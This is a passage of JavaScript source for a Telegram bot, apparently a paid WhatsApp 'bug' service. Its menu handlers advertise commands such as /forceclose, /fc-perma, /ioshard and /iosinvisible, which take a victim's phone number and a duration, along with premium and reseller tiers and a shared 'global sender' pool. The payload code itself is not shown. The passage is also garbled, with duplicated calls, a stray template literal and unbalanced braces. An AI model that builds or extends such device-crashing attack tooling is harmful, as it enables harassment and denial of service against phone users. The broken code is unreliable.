                        `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> <b>Membership verified!</b>\nYou are now a member of both the channel and group. Try your command again (e.g., /start or /reqpair).`, 
                        { parse_mode: 'HTML' }
                    );
                } else {
                    S7.answerCallbackQuery(query.id, { 
                        text: '❌ You have not joined both the Channel and Group yet!', 
                        show_alert: true 
                    });
                }
            };


                        if (data === 'misc_menu') {
                const chatId = query.message.chat.id;
                const userId = query.from.id.toString();
                if (!LoveGlobalState(userId, chatId)) {
                    return sendSYLove(S7, chatId);
                }
                const love = query.from.id.toString();
                const miscText = MainSYLoVe(name, uptime, love, botConfig.botName, botConfig.ownerContact) + `<b>📊 Misc Menu</b>

➡️ /reqpair number ⚙
➡️ /delpair number ⚙
➡️ /listsender — sender stats ⚙
➡️ /myaccess — your tier ⚙
➡️ /addprem ID 30d ⚙
➡️ /delprem ID ⚙
➡️ /addsvip ID 30d 💎 ⚙
➡️ /delsvip ID ⚙
➡️ /addgprem groupId 30d ⚙
➡️ /addgsvip groupId 30d ⚙
➡️ /addresell ID ⚙
➡️ /delresell ID ⚙
➡️ /addtoken token ⚙
➡️ /deltoken token ⚙
➡️ /listprem /listsvip /listgprem ⚙
➡️ /listuser ⚙
➡️ /mytoken ⚙
➡️ /broadcast ⚙
➡️ /state 0 | 1  /global on/off ⚙`;
                S7edit(miscText, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML', ...SABIR7718 });
            }
                `;
                S7edit(miscText, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML', ...SABIR7718 });
            }

                        if (data === 'bug_menu') {
                const chatId2 = query.message.chat.id;
                const userId2 = query.from.id.toString();
                if (!LoveGlobalState(userId2, chatId2)) return sendSYLove(S7, chatId2);
                const love2 = query.from.id.toString();
                const bugText = MainSYLoVe(name, uptime, love2, botConfig.botName, botConfig.ownerContact) + `<b>🤖 Bug Android (SVIP = Global Sender)</b>

➡️ /forceclose num time
➡️ /forceinfinity num time
➡️ /fc-perma num time
➡️ /forcehard num time
➡️ /delayinfinite num time

<b>🍎 Bug iOS</b>

➡️ /ioshard number time
➡️ /iosinvisible number time

<b>🤩 Group Tools</b>

➡️ /xgroup groupid
➡️ /listgc
➡️ /listsender — global pool
➡️ /groupid link

<b>💎 SVIP</b> → use Global Sender without pairing
<b>🏆 Group Premium</b> → bot active in group using global senders`;
                S7edit(bugText, { chat_id: chatId2, message_id: messageId, parse_mode: 'HTML', ...SABIR7718 });
                        }
                S7edit(bugText, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML', ...SABIR7718 });
                }
                
                
             if (data.startsWith('copy_jid_')) {
        const jid = data.replace('copy_jid_', '');
        await S7.answerCallbackQuery(query.id, {
            text: 'JID copied to clipboard!',
            show_alert: false
        });
    }
           });

    } catch (err) {
        log('error', 'STARTUP', `Could not start bot with token: ${token.substring(0, 10)}...`);
    }
}

// Start SYLove Bot
startSYloveBot(config.mainToken);

// Start Extra Bots
const db = getDB();
if (db.tokens && db.tokens.length > 0) {
    db.tokens.forEach(obj => {
    startSYloveBot(obj.token);
});
} else {
    log('info', null, 'No extra bots found in database.');
}

// === MONITOR DE MEMÓRIA E AUTO-RELOAD ===
setInterval(() => {
  const usado = process.memoryUsage().rss / 1024 / 1024;

  if (usado > 400) {
    console.log("♻️ Reiniciando bot por alto consumo de RAM...");
    process.exit(1);
  }
}, 60000);

let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  const logMsg = `Update= '${__filename}'`;
  if (typeof chalk !== 'undefined') {
    console.log(chalk.redBright(logMsg));
  } else {
    console.log(`\x1b[31m${logMsg}\x1b[0m`);
  }
  delete require.cache[file];
  require(file);
});
